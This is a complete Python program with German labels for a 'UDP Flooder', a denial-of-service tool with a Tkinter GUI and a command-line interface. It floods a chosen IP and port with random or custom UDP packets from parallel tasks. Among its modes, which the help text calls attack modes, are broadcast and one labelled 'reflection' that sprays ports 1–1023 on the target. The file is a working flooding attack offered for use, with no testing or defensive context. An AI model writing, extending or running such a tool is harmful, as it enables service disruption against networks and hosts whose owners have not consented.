import asyncio
import socket
import os
import struct
import argparse
import threading
import tkinter as tk
from datetime import datetime
import sys
import logging

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("UDPFlooder")

# --- UDP Flooder Class ---
class UDPFlooder:
    def __init__(self, ip, port, packet_size=1024, delay=0, mode='normal',
                 payload_mode='random', custom_payload=None, use_ipv6=False, concurrency=10):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.delay = delay
        self.mode = mode
        self.payload_mode = payload_mode
        self.custom_payload = custom_payload
        self.use_ipv6 = use_ipv6
        self.concurrency = concurrency

        self.packet_counter = 0
        self.stop_event = asyncio.Event()
        self.lock = asyncio.Lock()  # Für thread-safe Zähler

    def generate_payload(self):
        if self.payload_mode == 'random':
            return os.urandom(self.packet_size)
        else:
            if self.custom_payload:
                base = self.custom_payload.encode('utf-8')
                return (base * (self.packet_size // len(base) + 1))[:self.packet_size]
            else:
                return os.urandom(self.packet_size)

    async def send_packets(self, task_id):
        payload = self.generate_payload()
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM)
        sock.setblocking(False)

        # Modus-spezifische Einstellungen
        if self.mode == 'broadcast':
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            target = ('<broadcast>', self.port)
        elif self.mode == 'multicast':
            ttl = struct.pack('b', 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
            target = (self.ip, self.port)
        else:
            target = (self.ip, self.port)

        loop = asyncio.get_running_loop()

        try:
            while not self.stop_event.is_set():
                if self.mode == 'reflection':
                    for p in range(1, 1024):
                        if self.stop_event.is_set():
                            break
                        addr = (self.ip, p)
                        if self.use_ipv6:
                            addr = (self.ip, p, 0, 0)
                        await loop.sock_sendto(sock, payload, addr)
                        async with self.lock:
                            self.packet_counter += 1
                        if self.packet_counter % 100 == 0:
                            logger.info(f"[Task {task_id}] Reflection: {self.packet_counter} Pakete gesendet")
                        if self.delay > 0:
                            await asyncio.sleep(self.delay)
                else:
                    await loop.sock_sendto(sock, payload, target)
                    async with self.lock:
                        self.packet_counter += 1
                    if self.packet_counter % 100 == 0:
                        logger.info(f"[Task {task_id}] Gesendet {self.packet_counter} Pakete an {target[0]}:{target[1]}")
                    if self.delay > 0:
                        await asyncio.sleep(self.delay)
        except Exception as e:
            logger.error(f"[Task {task_id}] UDP Fehler: {e}")
        finally:
            sock.close()

    async def start(self):
        logger.info(f"Starte Flooder: {self.ip}:{self.port} | Modus: {self.mode} | Payload: {self.payload_mode} | "
                    f"Threads: {self.concurrency} | IPv6: {self.use_ipv6}")
        self.stop_event.clear()
        tasks = [asyncio.create_task(self.send_packets(i+1)) for i in range(self.concurrency)]
        await asyncio.gather(*tasks)

    def stop(self):
        self.stop_event.set()

# --- GUI Klasse ---
class AppGUI:
    def __init__(self, flooder):
        self.flooder = flooder
        self.root = tk.Tk()
        self.root.title("UDP Flooder - Weltbeschützer Edition")
        self.root.geometry("400x180")
        self.root.resizable(False, False)

        self.label_status = tk.Label(self.root, text="Status: Bereit", font=("Arial", 12))
        self.label_status.pack(pady=10)

        self.label_counter = tk.Label(self.root, text="Pakete gesendet: 0", font=("Arial", 14, "bold"))
        self.label_counter.pack(pady=10)

        self.frame_buttons = tk.Frame(self.root)
        self.frame_buttons.pack(pady=10)

        self.btn_start = tk.Button(self.frame_buttons, text="Start", width=12, command=self.start_flood)
        self.btn_start.grid(row=0, column=0, padx=10)

        self.btn_stop = tk.Button(self.frame_buttons, text="Stop", width=12, command=self.stop_flood, state=tk.DISABLED)
        self.btn_stop.grid(row=0, column=1, padx=10)

        self.update_gui_task = None
        self.loop = None
        self.thread = None

    def start_flood(self):
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.label_status.config(text="Status: Läuft...")
        self.flooder.stop_event.clear()

        # Asyncio Loop in Thread starten
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self.run_asyncio_loop, daemon=True)
        self.thread.start()

        self.update_gui()

    def run_asyncio_loop(self):
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_until_complete(self.flooder.start())
        except asyncio.CancelledError:
            logger.info("Flooder wurde gestoppt.")
        except Exception as e:
            logger.error(f"Asyncio Loop Fehler: {e}")

    def stop_flood(self):
        self.flooder.stop()
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.label_status.config(text="Status: Gestoppt")

    def update_gui(self):
        self.label_counter.config(text=f"Pakete gesendet: {self.flooder.packet_counter}")
        if self.flooder.stop_event.is_set():
            self.label_status.config(text="Status: Gestoppt")
            self.btn_start.config(state=tk.NORMAL)
            self.btn_stop.config(state=tk.DISABLED)
        else:
            self.root.after(500, self.update_gui)

    def run(self):
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.mainloop()

    def on_close(self):
        if not self.flooder.stop_event.is_set():
            self.stop_flood()
        self.root.destroy()

# --- CLI Argument Parser ---
def parse_args():
    parser = argparse.ArgumentParser(description="UDP Flooder - Weltbeschützer Edition")
    parser.add_argument("--ip", required=True, help="Ziel-IP Adresse")
    parser.add_argument("--port", type=int, required=True, help="Ziel-Port")
    parser.add_argument("--packet-size", type=int, default=1024, help="Größe der UDP-Pakete in Bytes")
    parser.add_argument("--delay", type=float, default=0, help="Verzögerung zwischen Paketen in Sekunden")
    parser.add_argument("--mode", choices=['normal', 'broadcast', 'multicast', 'reflection'], default='normal', help="Angriffsmodus")
    parser.add_argument("--payload-mode", choices=['random', 'custom'], default='random', help="Payload-Modus")
    parser.add_argument("--custom-payload", default=None, help="Custom Payload Text (nur bei payload-mode=custom)")
    parser.add_argument("--ipv6", action='store_true', help="IPv6 verwenden")
    parser.add_argument("--concurrency", type=int, default=10, help="Anzahl paralleler Tasks (Threads)")
    parser.add_argument("--nogui", action='store_true', help="GUI deaktivieren, nur CLI nutzen")
    return parser.parse_args()

# --- Main Funktion ---
def main():
    args = parse_args()

    flooder = UDPFlooder(
        ip=args.ip,
        port=args.port,
        packet_size=args.packet_size,
        delay=args.delay,
        mode=args.mode,
        payload_mode=args.payload_mode,
        custom_payload=args.custom_payload,
        use_ipv6=args.ipv6,
        concurrency=args.concurrency
    )

    if args.nogui:
        # Nur CLI-Modus
        logger.info("Starte im CLI-Modus. Drücke STRG+C zum Stoppen.")
        try:
            asyncio.run(flooder.start())
        except KeyboardInterrupt:
            logger.info("Flooder wurde gestoppt.")
    else:
        # GUI-Modus
        app = AppGUI(flooder)
        app.run()

if __name__ == "__main__":
    main()
